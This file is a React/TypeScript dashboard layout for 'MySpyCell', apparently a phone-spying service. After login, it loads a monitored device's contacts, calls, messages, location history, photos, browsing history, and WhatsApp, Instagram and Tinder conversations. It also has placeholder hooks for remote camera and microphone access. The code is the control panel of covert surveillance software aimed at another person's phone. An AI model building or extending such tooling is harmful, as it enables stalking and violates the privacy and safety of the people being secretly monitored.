import React, { ReactNode, useEffect, useState } from "react";
import Head from "next/head";
import { Grid, Flex, Box, Text } from "@chakra-ui/core";
import SidebarLayout from "./sidebarLayout";
import { connect } from "react-redux";

import { useDispatch } from "react-redux";
import { SetUser } from "../../store/actions/userActions";
import { SetPlan } from "../../store/actions/planActions";
import {
  SetAccount,
  SetActiveDevice,
} from "../../store/actions/accountActions";
import { SetDevice, SetDevices } from "../../store/actions/deviceAction";
import LoginForm from "../form/Login";
import {
  FetchApps,
  FetchCalls,
  FetchContacts,
  FetchDevice,
  FetchDevices,
  FetchGallery,
  FetchHistory,
  FetchInstagram,
  FetchLocations,
  FetchMessages,
  FetchPlan,
  FetchTinder,
  FetchUserAccount,
  FetchWhatsapp,
  FetchYoutube,
} from "../../services/ApiActions";
import { SetContacts } from "../../store/actions/contactActions";
import { SetCalls } from "../../store/actions/callActions";
import { SetMessages } from "../../store/actions/messageActions";
import { SetApps } from "../../store/actions/appActions";
import { SetHistory } from "../../store/actions/historyActions";
import { SetLocations } from "../../store/actions/locationActions";
import { SetWhatsapp } from "../../store/actions/whatsappActions";
import { SetYoutube } from "../../store/actions/youtubeActions";
import {
  FilterInstagramConversation,
  FilterTinderConversation,
  FilterWhatsappConversation,
} from "../../utils/filterConversations";
import { ConnectServer, LinkSocketFunctions } from "../../services/Socket";
import NavbarLayout from "../navBar";
import { SetInstagram } from "../../store/actions/instagramActions";
import { SetTinder } from "../../store/actions/tinderActions";
import { SetGallery } from "../../store/actions/galleryActions";
import {
  AddNotification,
  ClearNotification,
  DeleteNotification,
  UpdateNotification,
} from "../../store/actions/notificationActions";
type Props = {
  children?: ReactNode;
  title?: string;
  login: LoginState;
  user: UserState;
  account: AccountState;
  plan: PlanState;
  notification: UpdateState;
};

const DashboardLayout = ({
  children,
  title = "MySpyCell - Painel",
  login,
  user,
  account,
  plan,
  notification,
}: Props) => {
  const [Authenticade, SetAuthenticade] = useState<boolean>(false);
  const [Fetching, SetFetching] = useState<boolean>(false);
  const [Done, SetDone] = useState<boolean>(false);
  const [Error, SetError] = useState<boolean>(false);
  const [ErrorMessage, SetErrorMessage] = useState<string>("");

  const addNotification = (item: IUpdate) => {
    dispatch(AddNotification(item));
  };
  // const updateNotification = (item: IUpdate) => {
  //   dispatch(UpdateNotification(item));
  // };
  const removeNotification = (item: IUpdate) => {
    dispatch(DeleteNotification(item));
  };
  const clearNotification = () => {
    dispatch(ClearNotification());
  };

  const dispatch = useDispatch();

  async function SetupLogin() {
    var request = login.state;
    if (request != null) var userAccount: any = await FetchUserAccount(request);
    if (userAccount != null) {
      dispatch(SetUser(userAccount.UserInfo));
      //userAccount.AccountInfo.active_device = undefined;
      dispatch(SetAccount(userAccount.AccountInfo));
      var planId = userAccount.AccountInfo.plan;
      var plan = await FetchPlan(planId);
      if (plan != null) {
        dispatch(SetPlan(plan));
        if (request != null) {
          var devicesResponse: any = await FetchDevices(request);
        }
        dispatch(SetDevices(devicesResponse));
        if (devicesResponse.length > 0) {
          dispatch(SetActiveDevice(devicesResponse[0]));
        }
      } else {
        SetErrorMessage("O plano atual não existe");
        SetError(true);
      }
    } else {
      SetErrorMessage("Erro ao encontrar usuário no sistema");
      SetError(true);
    }
  }
  async function LoadDeviceData(id: string) {
    if (login.state) {
      dispatch(SetDevice(await FetchDevice(id, login.state)));
      dispatch(SetContacts(await FetchContacts(id, login.state)));
      dispatch(SetCalls(await FetchCalls(id, login.state)));
      dispatch(SetMessages(await FetchMessages(id, login.state)));
      dispatch(SetApps(await FetchApps(id, login.state)));
      dispatch(SetLocations(await FetchLocations(id, login.state)));
      dispatch(SetYoutube(await FetchYoutube(id, login.state)));
      dispatch(SetHistory(await FetchHistory(id, login.state)));
      dispatch(SetGallery(await FetchGallery(id, login.state)));
      dispatch(
        SetWhatsapp(
          FilterWhatsappConversation(await FetchWhatsapp(id, login.state))
        )
      );
      dispatch(
        SetInstagram(
          FilterInstagramConversation(await FetchInstagram(id, login.state))
        )
      );
      dispatch(
        SetTinder(FilterTinderConversation(await FetchTinder(id, login.state)))
      );
    }
  }
  async function LoadDataFrom(id: string, type: number) {
    if (login.state) {
      switch (type) {
        case 1:
          dispatch(SetDevice(await FetchDevice(id, login.state)));
          break;
        case 2:
          dispatch(SetContacts(await FetchContacts(id, login.state)));
          break;
        case 3:
          dispatch(SetCalls(await FetchCalls(id, login.state)));
          break;
        case 4:
          dispatch(SetMessages(await FetchMessages(id, login.state)));
          break;
        case 5:
          dispatch(SetHistory(await FetchHistory(id, login.state)));
          break;
        case 6:
          dispatch(SetYoutube(await FetchYoutube(id, login.state)));
          break;
        case 7:
          dispatch(SetGallery(await FetchGallery(id, login.state)));
          break;
        case 8:
          dispatch(SetLocations(await FetchLocations(id, login.state)));
          break;
        case 9:
          dispatch(SetApps(await FetchApps(id, login.state)));
          break;
        case 20:
          dispatch(
            SetWhatsapp(
              FilterWhatsappConversation(await FetchWhatsapp(id, login.state))
            )
          );
          break;
        case 21:
          dispatch(
            SetInstagram(
              FilterInstagramConversation(await FetchInstagram(id, login.state))
            )
          );
          break;
        case 22:
          dispatch(
            SetTinder(
              FilterTinderConversation(await FetchTinder(id, login.state))
            )
          );
          break;
        case 30:
          //camera
          break;
        case 31:
          //mic
          break;

        default:
          break;
      }
    }
  }

  const ConnectSocket = (login: ILogin) => {
    ConnectServer(login);
    LinkSocketFunctions(addNotification);
  };

  useEffect(() => {
    if (login.state?.token != undefined) {
      SetAuthenticade(true);
      SetFetching(true);
      SetupLogin();
      SetFetching(false);
      SetDone(true);

      ConnectSocket(login.state);
    } else {
      SetErrorMessage("Erro ao autenticar Usuário, faça o login novamente!");
      SetError(true);
    }
  }, [login]);

  useEffect(() => {
    if (account.state != null) {
      //if (account.state.active_device) {
      LoadDeviceData(account.state.active_device.reg_id);
      console.log("LOAD DEVICE DATA " + account.state.active_device.reg_id);
      //}
    }
  }, [account.state?.active_device]);

  return (
    <div>
      <Head>
        <title>{title}</title>
        <meta charSet="utf-8" />
        <meta name="viewport" content="initial-scale=1.0, width=device-width" />
      </Head>
      {Done ? (
        <>
          <Grid
            templateColumns="250px 1fr"
            templateAreas="
            'navbar navbar'
            'sidebar content'
            "
            width="100%"
            maxWidth="100vw"
            height="100%"
            backgroundColor="gray.800"
          >
            <Flex gridArea="navbar">
              <NavbarLayout
                login={login}
                account={account}
                plan={plan}
                user={user}
                notifications={notification}
                removeNotifications={removeNotification}
                clearNotifications={clearNotification}
              />
            </Flex>
            <Flex gridArea="sidebar">
              <SidebarLayout />
            </Flex>

            <Box gridArea="content" padding={4} height="100%">
              {children}
            </Box>
          </Grid>
        </>
      ) : !Authenticade && Fetching && !Error ? (
        <Flex
          maxWidth="100vw"
          height="100%"
          backgroundColor="gray.800"
          flexDir="column"
          alignItems="center"
        >
          <Text>Carregando dados</Text>
        </Flex>
      ) : !Authenticade && !Error ? (
        <Flex
          maxWidth="100vw"
          height="100%"
          backgroundColor="gray.800"
          flexDir="column"
          alignItems="center"
        >
          <Text>Autenticando</Text>
        </Flex>
      ) : Error ? (
        <Flex
          width="100%"
          height="70vh"
          backgroundColor="gray.800"
          flexDir="column"
          justifyContent="center"
          alignItems="center"
        >
          <Text
            fontWeight="bold"
            color="red.600"
            fontSize="1.2rem"
            marginTop={2}
          >
            {ErrorMessage}
          </Text>
          <Flex
            marginTop={2}
            width="100%"
            height="100%"
            maxHeight="580px"
            maxWidth="480px"
          >
            <LoginForm />
          </Flex>
        </Flex>
      ) : (
        ""
      )}
    </div>
  );
};

const mapStateProps = (state: {
  loginReducer: LoginState;
  userReducer: UserState;
  accountReducer: AccountState;
  planReducer: PlanState;
  notificationReducer: UpdateState;
}) => ({
  login: state.loginReducer,
  account: state.accountReducer,
  user: state.userReducer,
  plan: state.planReducer,
  notification: state.notificationReducer,
});

export default connect(mapStateProps)(DashboardLayout);
